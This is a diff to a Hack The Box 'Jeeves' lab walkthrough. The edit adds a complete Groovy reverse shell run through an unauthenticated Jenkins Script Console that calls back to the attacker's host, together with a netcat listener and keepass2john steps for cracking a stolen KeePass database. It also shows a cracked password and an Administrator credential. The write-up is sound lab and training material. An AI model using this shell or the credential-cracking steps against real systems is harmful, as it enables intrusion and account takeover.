@@ -47,7 +47,43 @@ http://10.129.228.112:50000/askjeeves
 
 # Initial Access
 
-The exposed Jenkins interface allowed command execution on the Windows host. After obtaining a shell, I confirmed that Jenkins was installed under the Administrator profile and inspected its files.
+The Jenkins instance exposed its unauthenticated Groovy Script Console at `/askjeeves/script`. I first started a listener on my Kali host:
+
+```bash
+nc -lvnp 9999
+```
+
+I then submitted the following Groovy reverse shell in the Script Console. It starts `cmd.exe`, connects back to the listener, and forwards the process input and output over the socket.
+
+```groovy
+String host = "10.10.14.48";
+int port = 9999;
+String cmd = "cmd";
+Process p = new ProcessBuilder(cmd).redirectErrorStream(true).start();
+Socket s = new Socket(host, port);
+InputStream pi = p.getInputStream(), pe = p.getErrorStream(), si = s.getInputStream();
+OutputStream po = p.getOutputStream(), so = s.getOutputStream();
+
+while (!s.isClosed()) {
+    while (pi.available() > 0) so.write(pi.read());
+    while (pe.available() > 0) so.write(pe.read());
+    while (si.available() > 0) po.write(si.read());
+    so.flush();
+    po.flush();
+    Thread.sleep(50);
+    try {
+        p.exitValue();
+        break;
+    } catch (Exception e) {
+        // The process is still running.
+    }
+}
+
+p.destroy();
+s.close();
+```
+
+Executing the script returned a shell. I confirmed that Jenkins was installed under the Administrator profile and inspected its files.
 
 ![Jenkins command execution](/assets/jeeves/Jeeves-3.png)
 
@@ -133,7 +169,13 @@ C:\Users\Administrator\.jenkins>copy C:\Users\kohsuke\Documents\CEH.kdbx \\10.10
         1 file(s) copied.
 ```
 
-After extracting the KeePass hash, John cracked the database password as `moonshine1`.
+I converted the database into a John-compatible hash before running the dictionary attack:
+
+```bash
+keepass2john CEH.kdbx > keepass.hash
+```
+
+John cracked the database password as `moonshine1`.
 
 ```bash
 ┌──(kali㉿kali)-[~/htb/Jeeves]
@@ -150,7 +192,7 @@ Session completed.
 keepassxc CEH.kdbx
 ```
 
-The database contained several entries, including credentials for the local Administrator account:
+The database contained separate `administrator` and `admin` entries. The `administrator` entry was relevant to the local Administrator account:
 
 ```text
 administrator:S1TjAtJHKsugh9oC4VZl
